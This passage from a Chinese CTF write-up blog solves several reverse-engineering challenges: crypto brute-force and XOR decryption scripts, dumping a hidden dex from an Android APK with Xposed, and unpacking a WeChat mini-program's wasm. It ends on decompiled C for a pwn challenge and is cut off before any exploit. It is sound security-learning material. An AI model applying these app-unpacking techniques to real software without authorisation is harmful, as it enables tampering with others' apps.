DES3.MODE_CBC, iv=iv)</span><br><span class="line">        pt = unpad(cipher.decrypt(TARGET), DES3.block_size)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n3DES-CBC (16-&gt;24 padded) -&gt; success&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;key24 hex:&quot;</span>, binascii.hexlify(k24).decode())</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;plaintext bytes:&quot;</span>, pt)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;utf-8:&quot;</span>, pt.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;utf-8 decode error:&quot;</span>, e)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n3DES-CBC -&gt; failed:&quot;</span>, e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">try_3des_cbc_with_24byte_key</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        k24 = (key_str * <span class="number">2</span>)[:<span class="number">24</span>]</span><br><span class="line">        iv = iv_str[:<span class="number">8</span>]</span><br><span class="line">        cipher = DES3.new(k24, DES3.MODE_CBC, iv=iv)</span><br><span class="line">        pt = unpad(cipher.decrypt(TARGET), DES3.block_size)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n3DES-CBC (constructed 24) -&gt; success&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;key24 hex:&quot;</span>, binascii.hexlify(k24).decode())</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;plaintext bytes:&quot;</span>, pt)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;utf-8:&quot;</span>, pt.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;utf-8 decode error:&quot;</span>, e)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n3DES-CBC (constructed 24) -&gt; failed:&quot;</span>, e)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行尝试</span></span><br><span class="line">try_aes_128_cbc()</span><br><span class="line">try_des_cbc_with_truncated_key()</span><br><span class="line">try_des_ecb_truncated_key()</span><br><span class="line">try_3des_cbc_with_16byte_key_padded()</span><br><span class="line">try_3des_cbc_with_24byte_key()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nDone.&quot;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;just_easy_strange_app_right?&#125;</span><br></pre></td></tr></table></figure>



<h2 id="SCTF2019-Strange-apk-Xposed安装以及反射大师安装"><a href="#SCTF2019-Strange-apk-Xposed安装以及反射大师安装" class="headerlink" title="[SCTF2019]Strange apk(Xposed安装以及反射大师安装)"></a>[SCTF2019]Strange apk(Xposed安装以及反射大师安装)</h2><p><img src="/2025/09/12/apk%E9%80%86%E5%90%91%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/3.png" alt="1"></p>
<p>是个输入flag验证的题目。</p>
<p><img src="/2025/09/12/apk%E9%80%86%E5%90%91%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/4.png" alt="1"></p>
<p>用jeb打开可以发现真的入口点是sctf.demo.myapplication.t，但是我们只看到了sctf.demo.myapplication.s所以我们知道app动态释放文件</p>
<p>我们要下载Xposed和反射大师这个下载太难搞了~~~~</p>
<p>记录一下步骤</p>
<p><img src="/2025/09/12/apk%E9%80%86%E5%90%91%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/5.png" alt="1"></p>
<p>点击激活在点击上方三条杠选择模版，首要是你已经安装了反射大师。</p>
<p><img src="/2025/09/12/apk%E9%80%86%E5%90%91%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/6.png" alt="1"></p>
<p>打开反射大师,按照一下步骤</p>
<p><img src="/2025/09/12/apk%E9%80%86%E5%90%91%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/7.png" alt="1"></p>
<p><img src="/2025/09/12/apk%E9%80%86%E5%90%91%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/8.png" alt="1"></p>
<p><img src="/2025/09/12/apk%E9%80%86%E5%90%91%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/9.png" alt="1"></p>
<p><img src="/2025/09/12/apk%E9%80%86%E5%90%91%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/10.png" alt="1"></p>
<p><img src="/2025/09/12/apk%E9%80%86%E5%90%91%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/11.png" alt="1"></p>
<p><img src="/2025/09/12/apk%E9%80%86%E5%90%91%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/12.png" alt="1"></p>
<p>然后打开windows的共享文件夹就可以得到dex文件。</p>
<p>在用jeb打开</p>
<p><img src="/2025/09/12/apk%E9%80%86%E5%90%91%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/14.png" alt="1"></p>
<p><img src="/2025/09/12/apk%E9%80%86%E5%90%91%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/15.png" alt="1"></p>
<p>第一部分解base64,第二部分去8</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;W3lc0me~t0_An4r0id-w0rld&#125;</span><br></pre></td></tr></table></figure>

<p>这题也可以直接用脚本</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_data</span>(<span class="params">input_file, output_file</span>):</span><br><span class="line">    key = <span class="string">&quot;syclover&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(input_file, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        encrypted_data = f.read()</span><br><span class="line"></span><br><span class="line">    decrypted_data = <span class="built_in">bytearray</span>()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(encrypted_data)):</span><br><span class="line">        decrypted_data.append(encrypted_data[i] ^ <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)]))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(decrypted_data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    input_file = <span class="string">&quot;data&quot;</span>  <span class="comment"># 指定输入的加密文件路径</span></span><br><span class="line">    output_file = <span class="string">&quot;sctf.apk&quot;</span>  <span class="comment"># 输出解密后的APK文件</span></span><br><span class="line">    decrypt_data(input_file, output_file)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;解密完成，APK已保存为 <span class="subst">&#123;output_file&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>



<h2 id="BSidesSF2019-blink"><a href="#BSidesSF2019-blink" class="headerlink" title="[BSidesSF2019]blink"></a>[BSidesSF2019]blink</h2><p><img src="/2025/09/12/apk%E9%80%86%E5%90%91%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/18.png" alt="1"></p>
<p>这个就记录一下查壳把，答案base64转图片就成了。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://linkpwn.github.io/2025/09/09/%E6%B9%BE%E5%8C%BA%E6%9D%AF%E9%83%A8%E5%88%86re-pwn/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="linkpwn">
      <meta itemprop="description" content="linkpwn的学习经历">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="网络幻影">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/09/09/%E6%B9%BE%E5%8C%BA%E6%9D%AF%E9%83%A8%E5%88%86re-pwn/" class="post-title-link" itemprop="url">湾区杯部分re+pwn</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2025-09-09 20:59:08" itemprop="dateCreated datePublished" datetime="2025-09-09T20:59:08+08:00">2025-09-09</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2025-09-10 14:17:24" itemprop="dateModified" datetime="2025-09-10T14:17:24+08:00">2025-09-10</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/wp/" itemprop="url" rel="index"><span itemprop="name">wp</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="微信小程序"><a href="#微信小程序" class="headerlink" title="微信小程序"></a>微信小程序</h2><p>先用解包</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wedecode ./wxe4679cbcec91e410</span><br></pre></td></tr></table></figure>

<p>wedecode要自己安装，网上可以自己找教程。</p>
<p><img src="/2025/09/09/%E6%B9%BE%E5%8C%BA%E6%9D%AF%E9%83%A8%E5%88%86re-pwn/1.png" alt="1"></p>
<p>解包成功</p>
<p>找到validator.wasm</p>
<p>用wabt-1.0.37-windows将wasm —-&gt;   wat</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wasm2wat wasm文件 -o wat文件</span><br><span class="line">#wasm2wat validator.wasm -o 1.wat</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line">(module</span><br><span class="line">  (type (;0;) (func (param i32) (result i32)))</span><br><span class="line">  (type (;1;) (func))</span><br><span class="line">  (func (;0;) (type 0) (param i32) (result i32)</span><br><span class="line">    (local i32 i32 i32 i32)</span><br><span class="line">    block (result i32)  ;; label = @1</span><br><span class="line">      block  ;; label = @2</span><br><span class="line">        block  ;; label = @3</span><br><span class="line">          local.get 0</span><br><span class="line">          local.tee 3</span><br><span class="line">          i32.const 3</span><br><span class="line">          i32.and</span><br><span class="line">          i32.eqz</span><br><span class="line">          br_if 0 (;@3;)</span><br><span class="line">          i32.const 0</span><br><span class="line">          local.get 0</span><br><span class="line">          i32.load8_u</span><br><span class="line">          i32.eqz</span><br><span class="line">          br_if 2 (;@1;)</span><br><span class="line">          drop</span><br><span class="line">          loop  ;; label = @4</span><br><span class="line">            local.get 0</span><br><span class="line">            i32.const 1</span><br><span class="line">            i32.add</span><br><span class="line">            local.tee 0</span><br><span class="line">            i32.const 3</span><br><span class="line">            i32.and</span><br><span class="line">            i32.eqz</span><br><span class="line">            br_if 1 (;@3;)</span><br><span class="line">            local.get 0</span><br><span class="line">            i32.load8_u</span><br><span class="line">            br_if 0 (;@4;)</span><br><span class="line">          end</span><br><span class="line">          br 1 (;@2;)</span><br><span class="line">        end</span><br><span class="line">        loop  ;; label = @3</span><br><span class="line">          local.get 0</span><br><span class="line">          local.tee 1</span><br><span class="line">          i32.const 4</span><br><span class="line">          i32.add</span><br><span class="line">          local.set 0</span><br><span class="line">          i32.const 16843008</span><br><span class="line">          local.get 1</span><br><span class="line">          i32.load</span><br><span class="line">          local.tee 4</span><br><span class="line">          i32.sub</span><br><span class="line">          local.get 4</span><br><span class="line">          i32.or</span><br><span class="line">          i32.const -2139062144</span><br><span class="line">          i32.and</span><br><span class="line">          i32.const -2139062144</span><br><span class="line">          i32.eq</span><br><span class="line">          br_if 0 (;@3;)</span><br><span class="line">        end</span><br><span class="line">        loop  ;; label = @3</span><br><span class="line">          local.get 1</span><br><span class="line">          local.tee 0</span><br><span class="line">          i32.const 1</span><br><span class="line">          i32.add</span><br><span class="line">          local.set 1</span><br><span class="line">          local.get 0</span><br><span class="line">          i32.load8_u</span><br><span class="line">          br_if 0 (;@3;)</span><br><span class="line">        end</span><br><span class="line">      end</span><br><span class="line">      local.get 0</span><br><span class="line">      local.get 3</span><br><span class="line">      i32.sub</span><br><span class="line">    end</span><br><span class="line">    i32.const 38</span><br><span class="line">    i32.ne</span><br><span class="line">    if  ;; label = @1</span><br><span class="line">      i32.const 0</span><br><span class="line">      return</span><br><span class="line">    end</span><br><span class="line">    loop  ;; label = @1</span><br><span class="line">      block  ;; label = @2</span><br><span class="line">        local.get 2</span><br><span class="line">        i32.load8_u offset=1024</span><br><span class="line">        local.get 2</span><br><span class="line">        local.get 3</span><br><span class="line">        i32.add</span><br><span class="line">        i32.load8_s</span><br><span class="line">        i32.xor</span><br><span class="line">        local.tee 0</span><br><span class="line">        i32.const 153</span><br><span class="line">        i32.eq</span><br><span class="line">        local.set 1</span><br><span class="line">        local.get 0</span><br><span class="line">        i32.const 153</span><br><span class="line">        i32.ne</span><br><span class="line">        br_if 0 (;@2;)</span><br><span class="line">        local.get 2</span><br><span class="line">        i32.const 1</span><br><span class="line">        i32.add</span><br><span class="line">        local.tee 2</span><br><span class="line">        i32.const 38</span><br><span class="line">        i32.ne</span><br><span class="line">        br_if 1 (;@1;)</span><br><span class="line">      end</span><br><span class="line">    end</span><br><span class="line">    local.get 1)</span><br><span class="line">  (func (;1;) (type 1))</span><br><span class="line">  (memory (;0;) 258 258)</span><br><span class="line">  (export &quot;a&quot; (memory 0))</span><br><span class="line">  (export &quot;b&quot; (func 1))</span><br><span class="line">  (export &quot;c&quot; (func 0))</span><br><span class="line">  (data (;0;) (i32.const 1024) &quot;\ff\f5\f8\fe\e2\ff\f8\fc\a9\fb\ab\ae\fa\ad\ac\a8\fa\ae\ab\a1\a1\af\ae\f8\ac\af\ae\fc\a1\fa\a8\fb\fb\ad\fc\ac\aa\e4&quot;))</span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 内存数据（十六进制字节）</span></span><br><span class="line">data = [</span><br><span class="line">    <span class="number">0xff</span>, <span class="number">0xf5</span>, <span class="number">0xf8</span>, <span class="number">0xfe</span>, <span class="number">0xe2</span>, <span class="number">0xff</span>, <span class="number">0xf8</span>, <span class="number">0xfc</span>, <span class="number">0xa9</span>, <span class="number">0xfb</span>,</span><br><span class="line">    <span class="number">0xab</span>, <span class="number">0xae</span>, <span class="number">0xfa</span>, <span class="number">0xad</span>, <span class="number">0xac</span>, <span class="number">0xa8</span>, <span class="number">0xfa</span>, <span class="number">0xae</span>, <span class="number">0xab</span>, <span class="number">0xa1</span>,</span><br><span class="line">    <span class="number">0xa1</span>, <span class="number">0xaf</span>, <span class="number">0xae</span>, <span class="number">0xf8</span>, <span class="number">0xac</span>, <span class="number">0xaf</span>, <span class="number">0xae</span>, <span class="number">0xfc</span>, <span class="number">0xa1</span>, <span class="number">0xfa</span>,</span><br><span class="line">    <span class="number">0xa8</span>, <span class="number">0xfb</span>, <span class="number">0xfb</span>, <span class="number">0xad</span>, <span class="number">0xfc</span>, <span class="number">0xac</span>, <span class="number">0xaa</span>, <span class="number">0xe4</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 每个字节与0x99异或，并转换为ASCII字符串</span></span><br><span class="line">result = <span class="built_in">bytes</span>(b ^ <span class="number">0x99</span> <span class="keyword">for</span> b <span class="keyword">in</span> data)</span><br><span class="line">flag = result.decode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;fae0b27c451c728867a567e8c1bb4e53&#125;</span><br></pre></td></tr></table></figure>





<h2 id="ood-canary"><a href="#ood-canary" class="headerlink" title="ood_canary"></a>ood_canary</h2><p>before_main</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">before_main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(name, <span class="string">&quot;ctfer&quot;</span>);</span><br><span class="line">  <span class="built_in">sprintf</span>(bss, <span class="string">&quot;Don&#x27;t always trust the canary.&quot;</span>);</span><br><span class="line">  result = <span class="number">0LL</span>;</span><br><span class="line">  __writefsqword(<span class="number">0x28u</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>main</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 buf[<span class="number">2</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  buf[<span class="number">1</span>] = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enjoy the game !\n&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    buf[<span class="number">0</span>] = <span class="number">0LL</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Choose (good/vuln/exit): &quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">7uLL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>((<span class="type">const</span> <span class="type">char</span> *)buf, <span class="string">&quot;good&quot;</span>, <span class="number">4uLL</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      good_news();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>((<span class="type">const</span> <span class="type">char</span> *)buf, <span class="string">&quot;vuln&quot;</span>, <span class="number">4uLL</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      vuln();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>((<span class="type">const</span> <span class="type">char</span> *)buf, <span class="string">&quot;exit&quot;</span>, <span class="number">4uLL</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      exit_a(<span class="number">1LL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Invalid choice!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>good_news</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">good_news</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 buf[<span class="number">5</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;I will tell you good news,%s \n&quot;</span>, name);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;but you must tell me your name first:&quot;</span>);</span><br><span class="line">  *((_BYTE *)buf + (<span class="type">int</span>)read(<span class="number">0</span>, buf, <span class="number">0x28u</span>LL)) = <span class="number">10</span>;</span><br><span class="line">  *(_QWORD *)bss = &amp;<span class="built_in">puts</span>;</span><br><span class="line">  <span class="built_in">strncpy</span>(name, (<span class="type">const</span> <span class="type">char</span> *)buf, <span class="number">0x20u</span>LL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Great, the good news is that I know your real name,%s\n&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)buf);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>exit_a</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">exit_a</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v2; <span class="comment">// [rsp+17h] [rbp-9h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Are you sure ? [y/n]&quot;</span>);</span><br><span class="line">  v2 = getchar();</span><br><span class="line">  <span class="keyword">while</span> ( getchar() != <span class="number">10</span> )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( v2 == <span class="number">121</span> )</span><br><span class="line">    _exit(a1);</span><br><span class="line">  <span class="keyword">if</span> ( flag )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_QWORD *)bss = &amp;v2;</span><br><span class="line">    --flag;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;you lost flag &quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>vuln</p>
